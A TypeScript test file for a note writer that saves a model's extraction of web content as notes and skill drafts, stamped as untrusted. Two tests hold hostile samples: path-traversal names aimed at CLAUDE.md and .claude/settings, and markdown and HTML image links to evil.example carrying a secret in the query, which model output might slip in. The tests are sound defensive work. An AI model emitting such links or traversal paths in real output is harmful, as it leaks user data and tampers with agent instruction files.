import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { listConceptTitles, writeNotes } from "./writer.ts";
import type { Extraction } from "./extract.ts";
import { newItem } from "../../shared/feed.ts";
import { isSkillName } from "./skills.ts";

let vault: string;
const NOW = new Date(2026, 9, 15, 12).getTime();
const item = newItem("a", "https://example.com/post", "auto", "", NOW)!;
const read = (rel: string): string => readFileSync(join(vault, ...rel.split("/")), "utf8");

const extraction: Extraction = {
	title: "How hooks work",
	summary: "A talk about hooks.",
	keyPoints: [{ text: "Hooks run before tools" }],
	quotes: [],
	concepts: [{ name: "Hooks", definition: "Scripts the harness runs.", isNew: true }],
	skill: null,
};

beforeEach(() => {
	vault = mkdtempSync(join(tmpdir(), "feed-writer-"));
	mkdirSync(join(vault, "reference", "sources"), { recursive: true });
	mkdirSync(join(vault, "brain", "concepts"), { recursive: true });
	writeFileSync(join(vault, "CLAUDE.md"), "# Rules\n");
});
afterEach(() => rmSync(vault, { recursive: true, force: true }));

describe("listConceptTitles", () => {
	test("lists the markdown notes under brain/concepts by title", async () => {
		writeFileSync(join(vault, "brain", "concepts", "Hooks.md"), "x");
		writeFileSync(join(vault, "brain", "concepts", "Prompt Caching.md"), "x");
		writeFileSync(join(vault, "brain", "concepts", "image.png"), "x");
		mkdirSync(join(vault, "brain", "concepts", "Folder.md"));
		expect(await listConceptTitles(vault)).toEqual(["Hooks", "Prompt Caching"]);
	});

	test("is empty when the folder does not exist", async () => {
		rmSync(join(vault, "brain"), { recursive: true });
		expect(await listConceptTitles(vault)).toEqual([]);
	});
});

describe("writeNotes", () => {
	test("writes the source note and a new concept note, linked to each other, stamped untrusted", async () => {
		const result = await writeNotes(vault, item, extraction, NOW);
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		expect(result.changed).toEqual(["reference/sources/How hooks work.md", "brain/concepts/Hooks.md"]);
		const source = read("reference/sources/How hooks work.md");
		const concept = read("brain/concepts/Hooks.md");
		expect(source).toContain("[[brain/concepts/Hooks|Hooks]]");
		expect(concept).toContain("[[reference/sources/How hooks work|How hooks work]]");
		expect(source.match(/^provenance: feed-untrusted$/gm)?.length).toBe(1);
		expect(concept.match(/^provenance: feed-untrusted$/gm)?.length).toBe(1);
		expect(source).toContain("date: 2026-10-15");
	});

	test("an existing concept is matched case-insensitively and appended to, keeping its text", async () => {
		writeFileSync(join(vault, "brain", "concepts", "Hooks.md"), "---\ndate: 2026-01-01\n---\n# Hooks\n\nMy own notes.\n");
		const lower = { ...extraction, concepts: [{ name: "hooks", definition: "Scripts the harness runs.", isNew: true }] };
		const result = await writeNotes(vault, item, lower, NOW);
		expect(result.ok && result.changed).toEqual(["reference/sources/How hooks work.md", "brain/concepts/Hooks.md"]);
		expect(readdirSync(join(vault, "brain", "concepts"))).toEqual(["Hooks.md"]);
		const concept = read("brain/concepts/Hooks.md");
		expect(concept).toContain("My own notes.");
		expect(concept).toContain("## From [[reference/sources/How hooks work|How hooks work]] (2026-10-15)");
		expect(read("reference/sources/How hooks work.md")).toContain("[[brain/concepts/Hooks|Hooks]]");
		expect(concept).toContain("provenance: feed-untrusted");
	});

	test("with appendExisting false, an existing concept is listed in the source note, not appended", async () => {
		const original = ["---", "date: 2026-01-01", "---", "# Caching", "", "My own notes.", ""].join("\n");
		writeFileSync(join(vault, "brain", "concepts", "Caching.md"), original);
		const both = {
			...extraction,
			concepts: [
				{ name: "Caching", definition: "Keeping answers close.", isNew: false },
				{ name: "Edge", definition: "Servers near users.", isNew: true },
			],
		};
		const result = await writeNotes(vault, item, both, NOW, { appendExisting: false });
		expect(result.ok && result.changed).toEqual(["reference/sources/How hooks work.md", "brain/concepts/Edge.md"]);
		expect(read("brain/concepts/Caching.md")).toBe(original);
		expect(existsSync(join(vault, "brain", "concepts", "Edge.md"))).toBe(true);
		const source = read("reference/sources/How hooks work.md");
		expect(source).toContain("## To merge into existing notes");
		expect(source).toMatch(/^- \[\[Caching\]\]:/m);
		expect(source).toContain("Keeping answers close.");
	});

	test("feeding the same link again changes nothing and says so", async () => {
		await writeNotes(vault, item, extraction, NOW);
		const before = read("brain/concepts/Hooks.md");
		const again = await writeNotes(vault, item, extraction, NOW);
		expect(again.ok).toBe(true);
		if (!again.ok) return;
		expect(again.changed).toEqual([]);
		expect(again.warnings.join(" ")).toMatch(/already/i);
		expect(read("brain/concepts/Hooks.md")).toBe(before);
		expect(readdirSync(join(vault, "reference", "sources"))).toEqual(["How hooks work.md"]);
	});

	test("a different source with the same title gets a numbered name, and the concept links it once", async () => {
		await writeNotes(vault, item, extraction, NOW);
		const other = newItem("b", "https://example.com/other", "auto", "", NOW)!;
		const second = await writeNotes(vault, other, extraction, NOW);
		expect(second.ok && second.changed).toEqual(["reference/sources/How hooks work (2).md", "brain/concepts/Hooks.md"]);
		const concept = read("brain/concepts/Hooks.md");
		expect(concept.split("## From [[reference/sources/How hooks work (2)|How hooks work (2)]]").length - 1).toBe(1);
		expect(concept.split("[[reference/sources/How hooks work|How hooks work]]").length - 1).toBe(1);
	});

	test("hostile titles and concept names cannot leave the three folders", async () => {
		const hostile: Extraction = {
			...extraction,
			title: "../../CLAUDE",
			concepts: [
				{ name: "..\\..\\.claude\\settings", definition: "d", isNew: true },
				{ name: "CLAUDE", definition: "d", isNew: true },
				{ name: "C:\\Windows\\x", definition: "d", isNew: true },
				{ name: "NUL", definition: "d", isNew: true },
			],
		};
		const result = await writeNotes(vault, item, hostile, NOW);
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		for (const rel of result.changed) {
			expect(rel, rel).toMatch(/^(reference\/sources|brain\/concepts)\/[^/]+\.md$/);
			expect(rel.toLowerCase(), rel).not.toMatch(/\/(claude|agents|gemini)\.md$/);
		}
		expect(read("CLAUDE.md")).toBe("# Rules\n");
		expect(existsSync(join(vault, ".claude"))).toBe(false);
	});

	test("web images the model slipped in are turned into text in every note", async () => {
		const sneaky: Extraction = {
			...extraction,
			summary: "![x](https://evil.example/p.png?d=secret)",
			concepts: [{ name: "Hooks", definition: "<img src=\"https://evil.example/q.png\">", isNew: true }],
		};
		await writeNotes(vault, item, sneaky, NOW);
		expect(read("reference/sources/How hooks work.md")).not.toContain("evil.example/p.png");
		expect(read("brain/concepts/Hooks.md")).not.toContain("evil.example/q.png");
	});

	test("a skill draft is written only for kind auto or skill, and only as thinking/skill-drafts/<name>/SKILL.md", async () => {
		const withSkill: Extraction = { ...extraction, skill: { name: "hook-pattern", description: "Use hooks.", body: "# Steps" } };
		const auto = await writeNotes(vault, item, withSkill, NOW);
		expect(auto.ok && auto.drafts).toEqual(["hook-pattern"]);
		expect(auto.ok && auto.changed).toContain("thinking/skill-drafts/hook-pattern/SKILL.md");
		expect(read("thinking/skill-drafts/hook-pattern/SKILL.md")).toContain("provenance: feed-untrusted");

		const sourceOnly = newItem("b", "https://example.com/other", "source", "", NOW)!;
		const plain = await writeNotes(vault, sourceOnly, { ...withSkill, title: "Other" }, NOW);
		expect(plain.ok && plain.drafts).toEqual([]);
		expect(existsSync(join(vault, ".claude"))).toBe(false);
	});

	test("an existing draft of the same name is not overwritten", async () => {
		mkdirSync(join(vault, "thinking", "skill-drafts", "hook-pattern"), { recursive: true });
		writeFileSync(join(vault, "thinking", "skill-drafts", "hook-pattern", "SKILL.md"), "mine");
		const withSkill: Extraction = { ...extraction, skill: { name: "hook-pattern", description: "Use hooks.", body: "# Steps" } };
		const result = await writeNotes(vault, item, withSkill, NOW);
		expect(result.ok && result.drafts).toEqual(["hook-pattern-2"]);
		expect(read("thinking/skill-drafts/hook-pattern/SKILL.md")).toBe("mine");
		expect(isSkillName("hook-pattern-2")).toBe(true);
	});

	test("a concept note that is a link is left alone", async () => {
		const outside = mkdtempSync(join(tmpdir(), "feed-outside-"));
		try {
			writeFileSync(join(outside, "target.md"), "outside");
			try {
				symlinkSync(join(outside, "target.md"), join(vault, "brain", "concepts", "Hooks.md"));
			} catch {
				return; // no symlink permission on this machine
			}
			const result = await writeNotes(vault, item, extraction, NOW);
			expect(result.ok).toBe(true);
			expect(readFileSync(join(outside, "target.md"), "utf8")).toBe("outside");
		} finally {
			rmSync(outside, { recursive: true, force: true });
		}
	});

	test("an oversized existing concept note is not appended to", async () => {
		writeFileSync(join(vault, "brain", "concepts", "Hooks.md"), "x".repeat(2 * 1024 * 1024));
		const result = await writeNotes(vault, item, extraction, NOW);
		expect(result.ok).toBe(true);
		expect(readFileSync(join(vault, "brain", "concepts", "Hooks.md"), "utf8").length).toBe(2 * 1024 * 1024);
		expect(result.ok && result.warnings.length).toBeGreaterThan(0);
	});

	test("fails with a clear error when the vault folder does not exist, and creates nothing", async () => {
		const missing = join(vault, "nope");
		const result = await writeNotes(missing, item, extraction, NOW);
		expect(result.ok).toBe(false);
		expect(existsSync(missing)).toBe(false);
	});
});
